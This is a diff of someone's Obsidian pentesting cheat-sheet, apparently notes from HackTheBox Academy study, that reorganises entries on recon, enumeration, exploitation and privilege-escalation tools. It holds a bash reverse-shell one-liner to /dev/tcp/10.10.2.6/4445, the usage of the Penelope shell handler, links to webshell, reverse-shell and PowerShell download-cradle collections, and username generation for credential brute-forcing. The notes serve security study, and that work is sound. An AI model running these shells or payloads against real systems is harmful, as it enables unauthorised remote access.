@@ -5,7 +5,22 @@
 [[Payloads]]
 
 ---
-# Comandos
+
+# OSINT / Recon
+
+> [!info]- Shodan
+> ![[Ciberseguridad/HTB Apuntes/Footprinting#Shodan]]
+
+>[!info]- ReconSpider
+>## Information
+>This tools extracts important information about a website such as emails, links, comments, etc.
+>## Installation
+>```shell
+>pip3 install scrapy
+>wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
+>unzip ReconSpider.zip
+>python3 ReconSpider.py http://dev.web1337.inlanefreight.htb:PORT
+>```
 
 > [!info]- Dig
 > ## Commands
@@ -25,31 +40,8 @@
 |`dig -x 192.168.1.1`|Performs a reverse lookup on the IP address 192.168.1.1 to find the associated host name. You may need to specify a name server.|
 |`dig +short domain.com`|Provides a short, concise answer to the query.|
 |`dig +noall +answer domain.com`|Displays only the answer section of the query output.|
-|`dig domain.com ANY`|Retrieves all available DNS records for the domain (Note: Many DNS servers ignore `ANY` queries to reduce load and prevent abuse, as per [RFC 8482](https://datatracker.ietf.org/doc/html/rfc8482)).|
+|`dig domain.com ANY`|Retrieves all available DNS records for the domain (Note: Many DNS servers ignore `ANY` queries to reduce load and prevent abuse, as per [RFC 8482](https://datatracker.ietf.org/doc/html/rfc8482)).|
 > ![[Ciberseguridad/HTB Apuntes/Footprinting#Dig]]
-
-> [!info]- Crunch 
-> **WordList Generator**
-
->[!Info]- Endocers y decoders
->![[Ciberseguridad/HTB Apuntes/JavaScript Deobfuscation#Base64]]
->![[Ciberseguridad/HTB Apuntes/JavaScript Deobfuscation#Hex]]
->![[Ciberseguridad/HTB Apuntes/JavaScript Deobfuscation#Caesar/Rot13]]
-
-
-# Páginas Web
-
->[!info]- Shells
-># WebShells
->## Laudanum, One Webshell to Rule Them All
-Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more. The repo includes injectable files for many different web application languages to include asp, aspx, jsp, php, and more.
->- https://github.com/jbarcia/Web-Shells/tree/master/laudanum
->>[!Important] 
->>The Laudanum files can be found already installed in the `/usr/share/laudanum` directory.
-># Reverse Shells
->These are repositories of reverse shells in Linux, Windows and MacOS.
->- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
->- https://www.revshells.com/ : Generador de Reverse Shell
 
 > [!info]- Web Certificate Search
 >![[Ciberseguridad/HTB Apuntes/Footprinting#[CRT.SH (Certificate Search)](https //crt.sh/)]]
@@ -59,12 +51,85 @@ Laudanum is a repository of ready-made files that can be used to inject onto a v
 > ## URL
 > https://mxtoolbox.com/
 
+> [!info]- username-anarchy
+> **Genera nombres de usuario a partir de nombres reales (nombre/apellido) para enumeración y fuerza bruta de credenciales.**
+>
+> ## Instalación
+> ```bash
+> git clone https://github.com/urbanadventurer/username-anarchy.git
+> cd username-anarchy
+> ```
+> Requiere Ruby.
+>
+> ## Modo de Uso
+> ```bash
+> ./username-anarchy anna key  # Genera variantes: anna, annakey, anna.key, annak, a.key, akey, etc.
+> ./username-anarchy --list-formats  # Lista los formatos de usuario disponibles
+> ./username-anarchy --input-file ./nombres.txt --select-format first.last  # Genera desde un archivo de nombres (CSV/TAB) con un formato específico
+> ./username-anarchy --country france --auto  # Genera usando los formatos más comunes de un país específico
+> ```
+> - Repositorio: https://github.com/urbanadventurer/username-anarchy
+
+# Enumeración
+
+> [!info]- Enum4Linux-ng
+> It is a tool for enumerating information from Windows and Samba systems. This tool automates many of the queries, but not all, and can return a large amount of information.
+> ## Instalación
+> ```shell-session
+>git clone https://github.com/cddmp/enum4linux-ng.git
+>pip3 install -r requirements.txt
+>```
+>## Usage
+>```shell-session
+enum4linux-ng.py 10.129.14.128 -A
+>```
+
+# Explotación
+
+>[!info]- Shells
+># WebShells
+>## Laudanum, One Webshell to Rule Them All
+Laudanum is a repository of ready-made files that can be used to inject onto a victim and receive back access via a reverse shell, run commands on the victim host right from the browser, and more. The repo includes injectable files for many different web application languages to include asp, aspx, jsp, php, and more.
+>- https://github.com/jbarcia/Web-Shells/tree/master/laudanum
+>>[!Important] 
+>>The Laudanum files can be found already installed in the `/usr/share/laudanum` directory.
+># Reverse Shells
+>These are repositories of reverse shells in Linux, Windows and MacOS.
+>- https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/
+>- https://www.revshells.com/ : Generador de Reverse Shell
+
+> [!info]- Penelope
+> **Controlador de shell que reemplaza a netcat, pensado para simplificar la explotación de RCE y los flujos de post-explotación.**
+>
+> - Repositorio: https://github.com/brightio/penelope
+>
+> ## Modo de Uso
+> ```shell
+> bash -c 'exec bash >& /dev/tcp/10.10.2.6/4445 0>&1 &' # Principal
+> ```
+> Otras opciones para uso más específico:
+> ```bash
+> penelope  # Listening for reverse shells on 0.0.0.0:4444
+> penelope -a   # Listening for reverse shells on 0.0.0.0:4444 and show reverse shell payloads based on the current Listeners
+> penelope -p 5555   # Listening for reverse shells on 0.0.0.0:5555
+> penelope -i eth0 -p 5555  # Listening for reverse shells on eth0:5555
+> penelope -c target -p 3333  # Connect to a bind shell on target:3333
+> penelope ssh user@target  # Get a reverse shell from target on local port 4444
+> penelope -p 5555 ssh user@target  # Get a reverse shell from target on local port 5555
+> penelope -i eth0 -p 5555 -- ssh -l user -p 2222 target  # Get a reverse shell from target on eth0, local port 5555 (use -- if ssh needs switches)
+> penelope -s <File/Folder>  # Share a file or folder via HTTP
+> ```
+
+>[!Info]- Powershell download cradles
+>Extensive list of commands in Powershell cradles yo download or invoke for file tranfers.
+>- https://gist.github.com/HarmJ0y/bb48307ffa663256e239
+
 >[!info]- JavaScript Obfuscation and Deobfuscation
 ># Obfuscation
->We can try obfuscating code using the same tool in [JSF](http://www.jsfuck.com/), and then rerunning it. We will notice that the code may take some time to run, which shows how code obfuscation could affect the performance, as previously mentioned.
->>There are many other JavaScript obfuscators, like [JJ Encode](https://utf-8.jp/public/jjencode.html) or [AA Encode](https://utf-8.jp/public/aaencode.html). However, such obfuscators usually make code execution/compilation very slow, so it is not recommended to be used unless for an obvious reason, like bypassing web filters or restrictions.
+>We can try obfuscating code using the same tool in [JSF](http://www.jsfuck.com/), and then rerunning it. We will notice that the code may take some time to run, which shows how code obfuscation could affect the performance, as previously mentioned.
+>>There are many other JavaScript obfuscators, like [JJ Encode](https://utf-8.jp/public/jjencode.html) or [AA Encode](https://utf-8.jp/public/aaencode.html). However, such obfuscators usually make code execution/compilation very slow, so it is not recommended to be used unless for an obvious reason, like bypassing web filters or restrictions.
 >## Minifier
->A common way of reducing the readability of a snippet of JavaScript code while keeping it fully functional is JavaScript minification. `Code minification` means having the entire code in a single (often very long) line. `Code minification` is more useful for longer code, as if our code only consisted of a single line, it would not look much different when minified.
+>A common way of reducing the readability of a snippet of JavaScript code while keeping it fully functional is JavaScript minification. `Code minification` means having the entire code in a single (often very long) line. `Code minification` is more useful for longer code, as if our code only consisted of a single line, it would not look much different when minified.
 >
 > **URL:** https://javascript-minifier.com/
 > ### Example
@@ -80,7 +145,7 @@ console.log("SUMA: " + num3)
 var numero=10;console.log(numero);let numero2=12,num3=numero+numero2;console.log("SUMA: "+num3);
 >```
 >## Packing JavaScript code
-Now, let us obfuscate our line of code to make it more obscure and difficult to read. First, we will try [BeautifyTools](http://beautifytools.com/javascript-obfuscator.php) to obfuscate our code.
+Now, let us obfuscate our line of code to make it more obscure and difficult to read. First, we will try [BeautifyTools](http://beautifytools.com/javascript-obfuscator.php) to obfuscate our code.
 >**URL:** http://beautifytools.com/javascript-obfuscator.php
 >### Example
 **INPUT:**
@@ -107,7 +172,7 @@ var _0xb01ac5=_0x2fcf1e[0x0],_0x1441b2=_0x598f67+_0xb01ac5,_0x2d62a3=_0xab03['lM
 >![[Ciberseguridad/HTB Apuntes/JavaScript Deobfuscation#Deobfuscation]]
 >
 
-## PrivEsc
+# Post-Explotación / Escalada de Privilegios
 
 >[!info]- HackTricks 
 >Documenta técnicas de explotación, escalada de privilegios, enumeración de servicios, bypass de defensas, etc., organizadas por tecnología/plataforma. Sirve como referencia rápida durante un pentest
@@ -125,86 +190,15 @@ Repositorio con PoCs de una vulnerabilidad de _race condition_ en el subsistema 
 >[!info]- GTFObins
 >https://gtfobins.org/
 
+# Utilidades
 
-# Repositorios
+> [!info]- Crunch 
+> **WordList Generator**
 
-> [!info]- Penelope
-> ## Penelope
-Penelope es un potente controlador de shell creado como un reemplazo moderno de netcat para la explotación de RCE, con el objetivo de simplificar, acelerar y optimizar los flujos de trabajo posteriores a la explotación.
->- Repositorio: https://github.com/brightio/penelope
->
->```shell
->bash -c 'exec bash >& /dev/tcp/10.10.2.6/4445 0>&1 &' # Principal
->```
->#### Modo de Uso
->Otras opciones para uso más específico
->```bash
-penelope  # Listening for reverse shells on 0.0.0.0:4444
->penelope -a   # Listening for reverse shells on 0.0.0.0:4444 and show reverse shell payloads based on the current Listeners
->penelope -p 5555   # Listening for reverse shells on 0.0.0.0:5555
->penelope -i eth0 -p 5555  # Listening for reverse shells on eth0:5555
->penelope -c target -p 3333  # Connect to a bind shell on target:3333
->penelope ssh user@target  # Get a reverse shell from target on local port 4444
->penelope -p 5555 ssh user@target  # Get a reverse shell from target on local port 5555
->penelope -i eth0 -p 5555 -- ssh -l user -p 2222 target  # Get a reverse shell from target on eth0, local port 5555 (use -- if ssh needs switches)
-penelope -s <File/Folder>  # Share a file or folder via HTTP
->```
->## Penelope
-Penelope es un potente controlador de shell creado como un reemplazo moderno de netcat para la explotación de RCE, con el objetivo de simplificar, acelerar y optimizar los flujos de trabajo posteriores a la explotación.
->- Repositorio: https://github.com/brightio/penelope
->
->```shell
->bash -c 'exec bash >& /dev/tcp/10.10.2.6/4445 0>&1 &' # Principal
->```
->## Modo de Uso
-Otras opciones para uso más específico
->```bash
->penelope  # Listening for reverse shells on 0.0.0.0:4444
->>penelope -a   # Listening for reverse shells on 0.0.0.0:4444 and show reverse shell payloads based on the current Listeners
->penelope -p 5555   # Listening for reverse shells on 0.0.0.0:5555
->penelope -i eth0 -p 5555  # Listening for reverse shells on eth0:5555
->penelope -c target -p 3333  # Connect to a bind shell on target:3333
->penelope ssh user@target  # Get a reverse shell from target on local port 4444
->penelope -p 5555 ssh user@target  # Get a reverse shell from target on local port 5555
->penelope -i eth0 -p 5555 -- ssh -l user -p 2222 target  # Get a reverse shell from target on eth0, local port 5555 (use -- if ssh needs switches)
-penelope -s <File/Folder>  # Share a file or folder via HTTP
->```
-
-> [!info]- Enum4Linux-ng
-> It is a tool for enumerating information from Windows and Samba systems. This tool automates many of the queries, but not all, and can return a large amount of information.
-> ## Instalación
-> ```shell-session
->git clone https://github.com/cddmp/enum4linux-ng.git
->pip3 install -r requirements.txt
->```
->## Usage
->```shell-session
-enum4linux-ng.py 10.129.14.128 -A
->```
+>[!Info]- Endocers y decoders
+>![[Ciberseguridad/HTB Apuntes/JavaScript Deobfuscation#Base64]]
+>![[Ciberseguridad/HTB Apuntes/JavaScript Deobfuscation#Hex]]
+>![[Ciberseguridad/HTB Apuntes/JavaScript Deobfuscation#Caesar/Rot13]]
 
 > [!info]- SecLists
 > ![[Ciberseguridad/HTB Apuntes/Web Fuzzing#Wordlists]]
-
->[!Info]- Powershell download cradles
->Extensive list of commands in Powershell cradles yo download or invoke for file tranfers.
->- https://gist.github.com/HarmJ0y/bb48307ffa663256e239
-# OSINT
-
-> [!info]- Shodan
-> ![[Ciberseguridad/HTB Apuntes/Footprinting#Shodan]]
-
->[!info]- ReconSpider
->## Information
->This tools extracts important information about a website such as emails, links, comments, etc.
->## Installation
->```shell
->pip3 install scrapy
->wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
->unzip ReconSpider.zip
->python3 ReconSpider.py http://dev.web1337.inlanefreight.htb:PORT
->```
- 
-
-
-
-
